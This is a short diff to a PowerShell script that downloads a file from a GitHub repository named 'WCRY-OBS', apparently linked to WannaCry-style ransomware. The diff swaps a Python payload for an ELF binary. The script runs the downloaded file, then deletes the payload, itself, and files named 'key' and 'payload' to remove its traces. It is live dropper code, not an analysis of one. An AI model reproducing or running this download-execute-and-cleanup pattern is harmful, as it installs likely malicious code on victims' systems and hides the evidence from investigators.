@@ -1,8 +1,8 @@
-$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
+$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Book.elf'
 wget -Uri $url
 $scriptName = $MyInvocation.MyCommand.Name
-python3 Oshawott.py
-Remove-Item "Oshawott.py"
+./Book.elf
+Remove-Item "Book.elf"
 Remove-Item $scriptName
 Remove-Item "key"
 Remove-Item "payload"
